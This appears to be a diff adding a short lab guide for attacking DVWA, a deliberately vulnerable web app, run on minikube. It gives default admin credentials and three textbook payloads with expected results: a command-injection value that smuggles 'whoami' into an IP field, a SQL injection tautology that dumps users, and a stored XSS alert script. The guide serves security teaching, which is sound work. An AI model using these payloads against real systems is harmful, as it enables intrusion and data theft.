@@ -1,0 +1,45 @@
+DVWA Attack Vectors Guide
+
+🧠 Before You Begin:
+1. Access DVWA in the browser via `minikube service dvwa -n dvwa`.
+2. Login with default: admin / password
+3. Go to "DVWA Security" → Set to LOW
+
+---
+
+1️⃣ COMMAND INJECTION
+Location: DVWA → Command Injection
+
+Input:
+    127.0.0.1; whoami
+
+Result:
+    Will execute 'whoami' and show container user (e.g., www-data)
+
+---
+
+2️⃣ SQL INJECTION
+Location: DVWA → SQL Injection
+
+Input:
+    1' OR '1'='1
+
+Result:
+    All users dumped from DB — bypassed query filter.
+
+---
+
+3️⃣ STORED XSS
+Location: DVWA → Stored XSS
+
+Input:
+    <script>alert('XSS attack!')</script>
+
+Result:
+    Alert pops up when the comment is viewed — proof of JS execution.
+
+---
+
+🧹 CLEANUP
+    kubectl delete namespace dvwa
+    minikube stop
